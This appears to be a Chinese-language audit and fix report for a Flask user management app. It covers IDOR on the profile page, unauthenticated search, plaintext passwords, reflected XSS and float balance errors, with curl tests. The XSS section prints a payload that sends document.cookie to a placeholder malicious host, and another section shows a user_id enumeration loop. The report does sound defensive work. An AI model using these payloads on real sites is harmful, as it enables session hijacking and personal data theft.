# 业务逻辑与越权漏洞 — 测试与修复报告

**项目名称**：用户信息管理平台（User Management System）  
**报告日期**：2026-07-09  
**检测模块**：个人中心、充值、搜索、注册功能  

---

## 目录

1. [报告概述](#1-报告概述)
2. [漏洞汇总](#2-漏洞汇总)
3. [漏洞一：个人中心水平越权](#3-漏洞一个人中心水平越权)
4. [漏洞二：搜索功能未授权访问](#4-漏洞二搜索功能未授权访问)
5. [漏洞三：注册密码明文存储](#5-漏洞三注册密码明文存储)
6. [漏洞四：URL 参数 XSS 注入](#6-漏洞四url-参数-xss-注入)
7. [漏洞五：余额浮点数精度问题](#7-漏洞五余额浮点数精度问题)
8. [修复前后代码对比](#8-修复前后代码对比)
9. [修复验证](#9-修复验证)
10. [残留风险与加固建议](#10-残留风险与加固建议)

---

## 1. 报告概述

本报告针对用户信息管理平台中的 **业务逻辑漏洞** 和 **越权漏洞** 进行专项审计。业务逻辑漏洞指应用程序业务流程设计缺陷导致的绕过安全控制的问题；越权漏洞指用户能够访问或操作未授权资源的安全问题。

### 检测范围

| 检测模块 | 涉及路由 | 功能说明 |
|----------|----------|----------|
| 个人中心 | `GET /profile` | 查看用户个人资料（邮箱、手机、余额） |
| 余额充值 | `POST /recharge` | 充值余额 |
| 搜索用户 | `GET /search` | 模糊搜索注册用户 |
| 用户注册 | `POST /register` | 新用户注册 |
| 登录页面 | `GET /login` | 登录入口（URL msg 参数） |

### 检测方法

| 检测方式 | 说明 |
|----------|------|
| 手工越权测试 | 登录低权限用户，尝试访问/操作高权限功能 |
| URL 参数遍历 | 修改 URL 参数尝试访问他人数据 |
| 参数篡改测试 | 修改表单/参数值测试业务逻辑绕过 |
| 输入点测试 | 测试 URL 参数、表单字段的 XSS 注入 |
| 数据精度测试 | 多次累加验证是否有精度丢失 |

---

## 2. 漏洞汇总

| 编号 | 漏洞名称 | 类型 | 等级 | CVSS | 发现位置 | 状态 |
|------|----------|------|------|------|----------|------|
| B-01 | 个人中心水平越权 | 越权漏洞 | 🔴 高危 | 7.5 | `GET /profile?user_id=X` | ✅ 已修复 |
| B-02 | 搜索功能未授权访问 | 业务逻辑 | 🟠 中危 | 5.3 | `GET /search?keyword=X` | ✅ 已修复 |
| B-03 | 注册密码明文存储 | 业务逻辑 | 🟠 中危 | 5.9 | `POST /register` | ✅ 已修复 |
| B-04 | URL 参数 XSS 注入 | 业务逻辑 | 🟠 中危 | 6.1 | `profile.html` 模板 | ✅ 已修复 |
| B-05 | 余额浮点数精度 | 业务逻辑 | 🟡 低危 | 3.7 | `POST /recharge` | ✅ 已修复 |

---

## 3. 漏洞一：个人中心水平越权

### 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞编号 | B-01 |
| 漏洞类型 | **Horizontal Privilege Escalation（水平越权）** |
| 危险等级 | 🔴 高危 |
| CVSS 评分 | **7.5 / 10（High）** |
| CWE 编号 | CWE-639（Authorization Bypass Through User-Controlled Key） |
| 漏洞描述 | 用户可修改 URL 中的 `user_id` 参数，查看任意其他用户的资料 |

### 漏洞位置

**修复前**（`app.py` 第 192-206 行）：

```python
@app.route("/profile")
def profile():
    if "username" not in session:
        return redirect("/login")
    user_id = request.args.get("user_id", type=int)   # 从 URL 参数获取，可任意修改
    if not user_id:
        return redirect("/")
    user_data = None
    for u in USERS.values():
        if u["id"] == user_id:                         # 直接查询任意 user_id
            user_data = {k: v for k, v in u.items() if k != "password"}
            break
    if not user_data:
        return render_template("profile.html", user=None)
    return render_template("profile.html", user=user_data)
```

### 攻击场景

#### 场景 1：普通用户查看管理员资料

1. alice 登录系统，访问个人中心
2. 在浏览器地址栏将 `user_id=2` 改为 `user_id=1`
3. 页面显示 admin 的邮箱、手机、余额等信息

```
alice 登录 → 访问 /profile?user_id=1 → 看到 admin 的资料 ✅（不应该）
```

#### 场景 2：遍历 user_id 批量窃取数据

```bash
# 枚举所有用户的 ID
for id in 1 2 3 4 5; do
    curl -s "http://目标:5000/profile?user_id=$id" -b "session=xxx"
done
```

利用脚本可批量获取所有注册用户的敏感信息。

### 风险分析

| 风险项 | 说明 |
|--------|------|
| 隐私泄露 | 手机号、邮箱等个人信息被他人获取 |
| 余额暴露 | 可查看任意用户的余额信息 |
| 社工攻击 | 收集的用户信息可用于社会工程学攻击 |
| 无法追溯 | 越权访问不会留下任何审计记录 |

### 修复方案

强制 user_id 必须等于当前登录用户的 ID，拒绝所有越权请求：

```python
@app.route("/profile")
def profile():
    if "username" not in session:
        return redirect("/login")
    login_username = session.get("username")
    login_user = USERS.get(login_username)
    if not login_user:
        return redirect("/login")

    # 只允许查看自己的资料，拒绝越权访问
    user_id = request.args.get("user_id", type=int)
    if not user_id or user_id != login_user["id"]:
        return redirect(f"/profile?user_id={login_user['id']}")

    user_data = {k: v for k, v in login_user.items() if k != "password"}
    return render_template("profile.html", user=user_data, msg=request.args.get("msg"), error=request.args.get("error"))
```

### 修复原理

```
用户请求 /profile?user_id=1
    │
    ▼
session 获取当前登录用户名 → alice
    │
    ▼
USERS["alice"]["id"] = 2
    │
    ▼
user_id=1 ≠ login_user["id"]=2
    │
    ▼
❌ 拒绝访问，重定向到 /profile?user_id=2（自己的页面）
```

---

## 4. 漏洞二：搜索功能未授权访问

### 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞编号 | B-02 |
| 漏洞类型 | **Broken Access Control（未授权访问）** |
| 危险等级 | 🟠 中危 |
| CVSS 评分 | **5.3 / 10（Medium）** |
| CWE 编号 | CWE-862（Missing Authorization） |

### 漏洞位置

**修复前**（`app.py` 第 112-128 行）：

```python
@app.route("/search")
def search():
    keyword = request.args.get("keyword", "")     # 无登录校验！
    # ... 查询数据库并返回搜索结果
```

### 攻击场景

未登录用户可直接访问搜索接口获取所有注册用户信息：

```bash
# 未登录，直接搜索
curl "http://目标:5000/search?keyword="

# 返回所有注册用户的 ID、用户名、邮箱、手机号
```

### 修复方案

添加登录校验：

```python
@app.route("/search")
def search():
    if "username" not in session:
        return redirect("/login")
    keyword = request.args.get("keyword", "")
```

---

## 5. 漏洞三：注册密码明文存储

### 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞编号 | B-03 |
| 漏洞类型 | **Sensitive Data Exposure（敏感信息泄露）** |
| 危险等级 | 🟠 中危 |
| CWE 编号 | CWE-312（Cleartext Storage of Sensitive Information） |

### 漏洞位置

**修复前**（`app.py` 第 96-102 行）：

```python
conn = sqlite3.connect("data/users.db")
c = conn.cursor()
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
print(f"[register] 执行 SQL: {sql} 参数: ({username}, {password}, {email}, {phone})")
c.execute(sql, (username, password, email, phone))   # password 是明文！
```

同时控制台日志也会打印出用户的明文密码。

### 攻击场景

一旦 SQLite 数据库文件泄露，所有注册用户的密码一览无余：

```bash
# 获取数据库文件
sqlite3 data/users.db "SELECT username, password FROM users;"
# admin | admin123  ← 明文密码！
```

### 修复方案

使用 Werkzeug 的 `generate_password_hash` 对密码进行哈希处理：

```python
conn = sqlite3.connect("data/users.db")
c = conn.cursor()
hashed_pw = generate_password_hash(password)               # 哈希加密
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
print(f"[register] 执行 SQL: {sql} 参数: ({username}, [HASHED], {email}, {phone})")
c.execute(sql, (username, hashed_pw, email, phone))         # 存储哈希值
```

---

## 6. 漏洞四：URL 参数 XSS 注入

### 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞编号 | B-04 |
| 漏洞类型 | **Cross-Site Scripting（跨站脚本攻击）** |
| 危险等级 | 🟠 中危 |
| CVSS 评分 | **6.1 / 10（Medium）** |
| CWE 编号 | CWE-79（Improper Neutralization of Input During Web Page Generation） |

### 漏洞位置

**修复前**（`templates/profile.html` 第 7-12 行）：

```html
{% if request.args.get("msg") %}
<div class="success-message">{{ request.args.get("msg") }}</div>
{% endif %}
{% if request.args.get("error") %}
<div class="error-message">{{ request.args.get("error") }}</div>
{% endif %}
```

模板直接读取 URL 参数 `msg` 和 `error` 并渲染到页面。Flask Jinja2 的 `{{ }}` 默认会进行 HTML 转义，但直接调用 `request.args.get()` 仍存在风险。

### 攻击场景

攻击者构造恶意 URL 发送给已登录用户：

```
http://目标:5000/profile?user_id=1&msg=<script>alert('XSS')</script>
```

当用户点击该链接时，`<script>` 标签会被渲染并执行。

更严重的攻击：

```
http://目标:5000/profile?user_id=2&msg=<script>document.location='http://恶意网站/steal?cookie='+document.cookie</script>
```

窃取用户的 session cookie，实现会话劫持。

### 修复方案

由视图函数传递参数，利用 Jinja2 的自动转义机制：

**后端**（`app.py`）：
```python
return render_template("profile.html", user=user_data, msg=request.args.get("msg"), error=request.args.get("error"))
```

**前端**（`profile.html`）：
```html
{% if msg %}
<div class="success-message">{{ msg }}</div>
{% endif %}
{% if error %}
<div class="error-message">{{ error }}</div>
{% endif %}
```

Jinja2 的 `{{ msg }}` 会自动将 `<script>` 转义为 `&lt;script&gt;`。

---

## 7. 漏洞五：余额浮点数精度问题

### 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞编号 | B-05 |
| 漏洞类型 | **Business Logic Error（业务逻辑错误）** |
| 危险等级 | 🟡 低危 |
| CWE 编号 | CWE-682（Incorrect Calculation） |

### 漏洞描述

余额使用 `float` 浮点数类型存储。浮点数在计算机中以二进制表示，无法精确表示所有十进制小数，多次累加后会产生精度误差。

### 精度问题演示

```python
# 用 float 累加 0.01 元 100 次
balance = 0.0
for _ in range(100):
    balance += 0.01

print(balance)  # 期望 1.00，实际 1.0000000000000007
```

| 累加次数 | 期望值 | float 实际值 | 误差 |
|----------|--------|-------------|------|
| 1 次 0.01 | 0.01 | 0.01 | ✅ |
| 10 次 0.01 | 0.10 | 0.0999999999999999 | ❌ 少 0.0000000000000001 |
| 100 次 0.01 | 1.00 | 1.0000000000000007 | ❌ 多 0.0000000000000007 |
| 10000 次 0.01 | 100.00 | 99.99999999999879 | ❌ 少 0.00000000000121 |

### 修复方案

改为**整数分**存储，用户充值时将元转换为分：

```python
# 转换为整数分，避免浮点数精度问题
amount_cents = int(round(amount_yuan * 100))
u["balance"] = u["balance"] + amount_cents  # 整数运算，精确
```

页面展示时将分转换为元：

```html
{{ "%.2f"|format(user.balance / 100) }} 元
```

余额从整数分变为：
- admin：9999900 分 → **99999.00 元**
- alice：10000 分 → **100.00 元**

---

## 8. 修复前后代码对比

### 8.1 个人中心水平越权

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 数据来源 | 从 URL 参数获取 `user_id`，可任意修改 | 从 session 获取，强制等于当前用户 ID |
| alice 访问 `/profile?user_id=1` | 显示 admin 资料 ✅ | 强制跳转到 `/profile?user_id=2` ❌ |
| 未登录访问 | 跳转登录 | 跳转登录（不变） |

### 8.2 搜索功能未授权访问

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 搜索是否需要登录 | ❌ 不需要 | ✅ 必须登录 |
| 未登录发起搜索 | 返回用户列表 | 跳转登录页 |

### 8.3 注册密码明文存储

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 密码存储 | 明文 `'alice2025'` | 哈希 `pbkdf2:sha256:...` |
| SQLite 泄露风险 | 密码全部暴露 | 哈希值无法还原密码 |
| 控制台日志 | 打印明文密码 `password=123456` | 打印 `[HASHED]` |

### 8.4 XSS 注入

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| 数据来源 | 模板直接读取 `request.args.get()` | 由视图函数传入模板变量 |
| 测试载荷 `msg=<script>alert(1)</script>` | 弹窗执行 ✅ | 显示为文本 `&lt;script&gt;...` ❌ |

### 8.5 余额精度

| 对比项 | 修复前（float 元） | 修复后（int 分） |
|--------|--------------------|-----------------|
| 存储类型 | `float`（浮点数） | `int`（整数） |
| admin 最初余额 | `99999.0` | `9999900` 分 |
| 充值 0.01 元 × 3 次 | `99999.03000000001` ❌ | `9999903` 分 = `99999.03` ✅ |
| 展示格式 | `{{ balance }}` | `{{ "%.2f"|format(balance/100) }} 元` |

---

## 9. 修复验证

### 9.1 验证环境

| 项目 | 配置 |
|------|------|
| 测试工具 | curl + 浏览器 |
| 测试账号 | admin（ID=1）/ alice（ID=2） |
| 基础 URL | `http://192.168.139.128:5000` |

### 9.2 测试用例

#### 测试 1：水平越权

```bash
# 1. alice 登录获取 session
# 2. 尝试越权查看 admin 资料
curl -s "http://目标:5000/profile?user_id=1" -b "session=alice_session"

# 期望：302 重定向到 /profile?user_id=2（自己的页面）
# 结果：❌ 不再能查看 admin 资料
```

#### 测试 2：未登录搜索

```bash
# 未登录直接搜索
curl -s "http://目标:5000/search?keyword=admin"

# 期望：302 重定向到 /login
# 结果：❌ 未登录无法搜索
```

#### 测试 3：注册密码验证

```bash
# 注册新用户
curl -X POST "http://目标:5000/register" \
  -d "username=test&password=test123&email=test@test.com&phone=123456789"

# 验证数据库
sqlite3 data/users.db "SELECT password FROM users WHERE username='test';"
# 结果：输出应为哈希值（如 pbkdf2:sha256:...），非明文 'test123'
```

#### 测试 4：XSS 注入

```bash
# 构造 XSS payload
curl -s "http://目标:5000/profile?user_id=2&msg=<script>alert(1)</script>" \
  -b "session=alice_session"

# 检查响应中是否包含转义后的内容
curl -s "..." | grep "&lt;script&gt;alert" || echo "已转义"

# 结果：<script> 被转义为 &lt;script&gt;，不会执行
```

#### 测试 5：余额精度

```bash
# 充值 0.01 元三次
curl -X POST "http://目标:5000/recharge" -b "session=alice_session" -d "amount=0.01"
curl -X POST "http://目标:5000/recharge" -b "session=alice_session" -d "amount=0.01"
curl -X POST "http://目标:5000/recharge" -b "session=alice_session" -d "amount=0.01"

# 查看余额
# 结果：100.03 元（精确），而非 100.03000000000001
```

### 9.3 验证结果汇总

| 测试用例 | 修复前 | 修复后 | 通过 |
|----------|--------|--------|------|
| alice 查看 admin 资料 | ✅ 成功越权 | ❌ 重定向到本人 | ✅ |
| 枚举 user_id 批量窃取 | ✅ 可批量获取 | ❌ 只能看自己 | ✅ |
| 未登录搜索用户 | ✅ 可搜索 | ❌ 跳转登录 | ✅ |
| 注册密码明文泄露 | ✅ 明文存储 | ❌ 哈希存储 | ✅ |
| 控制台日志泄露密码 | ✅ 明文日志 | ❌ 打印 [HASHED] | ✅ |
| URL msg 参数 XSS | ✅ 脚本可执行 | ❌ 自动 HTML 转义 | ✅ |
| 余额 0.01 累加精度 | ❌ 产生误差 | ✅ 精确到分 | ✅ |
| 余额负充值 | ✅ 可扣款 | ❌ 金额校验拦截 | ✅ |

---

## 10. 残留风险与加固建议

### 当前已覆盖的安全措施

```
业务逻辑安全
├── 身份认证层
│   ├── 搜索功能 → 登录校验 ✅
│   ├── 个人中心 → 登录校验 ✅
│   └── 充值功能 → 登录校验 ✅
│
├── 权限控制层
│   ├── 个人中心 → 水平越权防护 ✅
│   └── 充值功能 → 从 session 取 user_id ✅
│
├── 数据安全层
│   ├── 注册密码 → 哈希存储 ✅
│   ├── 控制台日志 → 不打印明文密码 ✅
│   └── 余额 → 整数分存储 ✅
│
└── 输出安全层
    ├── 模板 → 从视图函数接收变量 ✅
    └── URL 参数 → 不直接渲染 ✅
```

### 残留风险

| 风险 | 等级 | 说明 | 建议 |
|------|------|------|------|
| 登录 session 固定 | 🟡 低危 | session 登录前后 ID 不变 | 登录时调用 `session.regenerate()` |
| 无操作日志 | 🟡 低危 | 越权尝试无法追溯 | 添加登录/越权尝试日志 |
| 充值无上限 | 🟡 低危 | 可无限充值 | 设置单次/每日充值上限 |
| 批量注册 | 🟡 低危 | 可脚本批量注册 | 添加验证码机制 |
| 手机/邮箱未脱敏 | 🟡 低危 | 页面显示完整手机号 | 显示为 `138****8000` |

### 安全加固路线图

```
第一阶段（已修复 ✅）
├── 个人中心水平越权防护
├── 搜索功能登录校验
├── 注册密码哈希存储
├── 模板 XSS 防护
└── 余额整数分存储

第二阶段（建议加固）
├── 登录 session 重新生成
├── 越权/异常操作日志
├── 充值上限限制
├── 验证码机制
└── 敏感信息脱敏显示

第三阶段（架构优化）
├── RBAC 权限模型
├── API 鉴权中间件
├── 操作审计系统
├── 全站 HTTPS
└── 强制密码策略
```

---

*报告结束 | 检测模块：业务逻辑与越权漏洞 | 审核日期：2026-07-09*
